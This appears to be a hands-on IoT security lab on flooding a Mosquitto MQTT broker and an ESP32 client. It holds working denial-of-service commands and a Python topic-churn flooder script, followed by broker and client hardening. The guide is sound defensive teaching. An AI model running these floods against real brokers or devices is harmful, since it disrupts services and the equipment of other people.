
#  Attack Scenario 5: Topic Flooding (publish/Topic-churn DoS)

**What you’ll prove:** even with auth + ACLs, an attacker who’s allowed to publish to some part of your broker can **overwhelm the broker or clients** by:

* **Publishing too fast**
* **Using very large payloads**
* **Creating tons of unique topics** (topic-tree churn)
* **Retaining** thousands of messages

We’ll do 3 mini-attacks and then lock things down.

---

##  Lab assumptions

* Broker: Mosquitto on Raspberry Pi (auth + ACLs already in place)
* ESP32:

  * **Subscribes to `/admin/cmd`** (LED control)
  * Publishes DHT to `/esp32/sensor`
* “Attacker” user: `attacker5` (we’ll allow it to publish only under `flood/#` for safety, and optionally to `/admin/cmd` during the demo phase)

---

##  What to watch during the attack (broker telemetry)

Open a **monitor terminal** on the Pi:

```bash
# Follow the broker log
sudo tail -f /var/log/mosquitto/mosquitto.log
```

Open a **metrics terminal** (temporarily allow \$SYS read for your admin user if needed):

```bash
# See message counters, dropped counts, etc.
mosquitto_sub -u admin -P admin -h <RPI_IP> -t '$SYS/broker/publish/messages/#' -v
```

* `…/received` ⇒ total PUBLISH received
* `…/sent` ⇒ total PUBLISH sent
* `…/dropped` ⇒ **messages dropped** due to inflight/queue limits (we’ll make this number climb) ([Eclipse Mosquitto][1])

---

##  Temporarily relax ACLs and add new attacker:

```conf
sudo mosquitto_passwd /etc/mosquitto/passwd attacker5
```

In `/etc/mosquitto/acl` add a sandbox where the attacker can write:

```conf
# Attacker flood sandbox ONLY (safe space for the demo)
user attacker5
topic write flood/#
# (Optionally, to show client impact on ESP32, TEMPORARILY allow /admin/cmd)
# topic write /admin/cmd
```

Restart:

```bash
sudo systemctl restart mosquitto
```

---

##  Part A — High-rate publish flood (single topic)

### Quick one-liner (simple, fast)

This hammers **one topic** with thousands of messages over **one connection**:

```bash
yes "x" | head -n 5000000 | mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t flood/rate -l -q 1
```

* `-l` reads lines from stdin as messages (single connection, very fast)
* `-q 1` forces **acknowledged delivery**, making the broker track inflight messages (more load)

**What you’ll see**

* `$SYS/…/received` shoots up
* ESP32 should be fine (it isn’t subscribed to `flood/#`)
* Broker CPU climbs; if limits are low you may see **“dropped”** count increase

---

##  Part B — Topic-churn flood (create thousands of topics)

### Python “attacker” (recommended)

This creates **many unique topics** quickly (and can also make them retained):

```python
# attacker_topic_churn.py
import paho.mqtt.client as mqtt, time, argparse

p = argparse.ArgumentParser()
p.add_argument("--host", required=True)
p.add_argument("--user", required=True)
p.add_argument("--pw", required=True)
p.add_argument("--count", type=int, default=10000)
p.add_argument("--retain", action="store_true")
p.add_argument("--qos", type=int, default=0)
p.add_argument("--size", type=int, default=10, help="payload bytes")
args = p.parse_args()

client = mqtt.Client(client_id="flooder", clean_session=True, protocol=mqtt.MQTTv311)
client.username_pw_set(args.user, args.pw)
client.connect(args.host, 1883, 60)

payload = b"A"*args.size
for i in range(args.count):
    topic = f"flood/{i:06d}"
    client.publish(topic, payload, qos=args.qos, retain=args.retain)
client.disconnect()
```

Run it:

```bash
python3 attacker_topic_churn.py --host <RPI_IP> --user attacker5 --pw attackerpass --count 20000 --qos 1
```

**Optional (worse):** add `--retain` to **fill the broker** with 20k retained topics.

**What you’ll see**

* `$SYS/…/received` grows fast
* If a user (or dashboard) is subscribing to `#`, it will **receive an avalanche**
* With `--retain`, the broker’s retained store grows (memory/disk usage); new `#` subscribers **instantly** get flooded

---

##  Part C — Direct client overload (hammer `/admin/cmd`)

*(Do this only briefly — it will spam the ESP32 callback.)*

```bash
yes "on" | head -n 20000 | mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t /admin/cmd -l -q 1
```

**Expected effect**

* ESP32’s `callback` fires thousands of times; LED may appear stuck/rapid flicker
* If your sketch toggles GPIO per message, the loop will get busy; Wi-Fi/MQTT keepalive may suffer (eventually disconnect/reconnect)

---

##  Cleanup after demo

* Kill any running publishers.
* If you used retained spam:

  ```bash
  # Clear all retained flood topics (scripted)
  for i in $(seq -w 000000 019999); do
    mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t flood/$i -n -r
  done
  ```
* Consider purging retained entries by **overwriting with empty** payloads (as above).

---

#  Remediation (broker-side)

> Mosquitto has **queue/inflight/size** limits. Set these to keep bad clients from starving the broker or others.

Edit `/etc/mosquitto/mosquitto.conf` (key lines):

```conf
# === Global / listener ===
# Limit per-listener concurrent clients (helps against connection storms)
listener 1883
max_connections 100        # demo-friendly cap; tune for your Pi
allow_anonymous false
password_file /etc/mosquitto/passwd
acl_file /etc/mosquitto/acl

# Keep payloads bounded (oversized drops)
message_size_limit 262144  # 256 KB; set smaller if you want
# ^ Broker rejects publish payloads above this size. :contentReference[oaicite:1]{index=1}

# QoS inflight cap per client (prevents one client from hogging acknowledgements)
max_inflight_messages 20
# ^ Dropped/blocked publishes will reflect in $SYS dropped counters. :contentReference[oaicite:2]{index=2}

# Don’t queue QoS0 for offline clients (prevents huge offline buildup)
queue_qos0_messages false   # default is false; keep it false :contentReference[oaicite:3]{index=3}

# Limit queued messages/bytes per client (offline or slow consumers)
max_queued_messages 1000    # per-client cap; 0 means ‘no limit’ (avoid 0) :contentReference[oaicite:4]{index=4}
max_queued_bytes 0          # 0 = unlimited; set e.g. 10m for 10 MB if supported :contentReference[oaicite:5]{index=5}

# Optional hygiene:
allow_zero_length_clientid false  # avoids auto-ID churners :contentReference[oaicite:6]{index=6}
persistent_client_expiration 1d   # clean up abandoned sessions sooner :contentReference[oaicite:7]{index=7}

# Logging (for the demo)
log_type all
log_dest file /var/log/mosquitto/mosquitto.log
```

**Why these help**

* `max_connections` caps connection-storm damage.
* `message_size_limit` blocks jumbo payloads. ([Debian Manpages][3], [Ubuntu Manpages][4])
* `max_inflight_messages` + `max_queued_messages`/`bytes` stop a single client from hoarding broker memory/acks; dropped counts show under `$SYS/…/dropped`.
* `queue_qos0_messages false` avoids building QoS0 mountains when a client is offline.

> Heads-up: Mosquitto **does not** have built-in per-client **rate limiting** (messages/sec). Use OS firewalls/proxies or app-layer gateways if you need strict throttling. ([Stack Overflow][6])

### (Optional) Network-level rate limiting (Linux `nftables`)

Example to cap incoming publish rate to port 1883 from a noisy IP:

```bash
sudo nft add table inet mqtt
sudo nft add chain inet mqtt input { type filter hook input priority 0 \; }
sudo nft add rule inet mqtt input tcp dport 1883 ip saddr 192.168.1.102 limit rate 50/second accept
sudo nft add rule inet mqtt input tcp dport 1883 drop
```

---

##  Remediation (ESP32/client-side)

**Goal:** make `/admin/cmd` resilient to spam.

1. **Debounce / rate-limit** command handling:

```cpp
unsigned long lastCmdMs = 0;
const unsigned long CMD_COOLDOWN_MS = 300; // drop bursts faster than 300 ms

void handleCmd(const String& msg) {
  unsigned long now = millis();
  if (now - lastCmdMs < CMD_COOLDOWN_MS) return; // ignore burst
  lastCmdMs = now;

  if (msg == "on") digitalWrite(LEDPIN, HIGH);
  else if (msg == "off") digitalWrite(LEDPIN, LOW);
}
```

2. **Bound payload size** and **ignore unknown commands** (avoid parsing heavy JSON for `/admin/cmd`).

3. **Prefer QoS 0** on `/admin/cmd` if you can tolerate an occasional miss (lower broker state), or **QoS 1** if you need reliability but keep the debounce above.

4. If using PubSubClient, you can **increase buffer** if needed to avoid stalls on modest payloads:

```cpp
client.setBufferSize(512);   // only if you truly need larger commands
```

5. Consider a **separate “admin” user** and topic namespace (already done), with **strict ACLs** so only your admin client can publish `/admin/cmd`.

---

##  Suggested workshop flow

1. Start `$SYS` metrics & log tail.
2. **Part A**: Run the rate flood (see counters spike).
3. **Part B**: Run topic-churn (with and without `--retain`). Show how a new `#` subscriber gets blasted instantly when retained is used.
4. **Part C**: Briefly hammer `/admin/cmd`; LED spasms; show ESP32 still “alive” but overloaded.
5. Apply the **broker limits**; re-run A/B/C → show:

   * \$SYS dropped counts increment (broker sheds load gracefully)
   * Attacker cannot crash things as easily
6. Keep the **ESP32 debounce** code to show **client-side resilience**.

---

##  Key takeaways

* Floods can be **rate**, **size**, **topic-count**, or **retained** based.
* Mosquitto gives you **inflight/queue/size/connection** controls — use them. ([Debian Manpages][3], [Eclipse Mosquitto][1], [SysTutorials][5])
* There’s **no built-in per-client msg/sec throttle** — enforce with firewall/gateway if needed. ([Stack Overflow][6])
* Harden clients: **debounce `/admin/cmd`**, validate inputs, and keep ACLs tight.

[3]: https://manpages.debian.org/stretch/mosquitto/mosquitto.conf.5.en.html "mosquitto.conf(5)"
[4]: https://manpages.ubuntu.com/manpages/kinetic/man5/mosquitto.conf.5.html "mosquitto.conf - the configuration file for ..."
[6]: https://stackoverflow.com/questions/52892133/can-i-throttle-mosquitto-so-that-no-client-may-publish-more-than-n-messages-per "Can I throttle mosquitto so that no client may publish more ..."
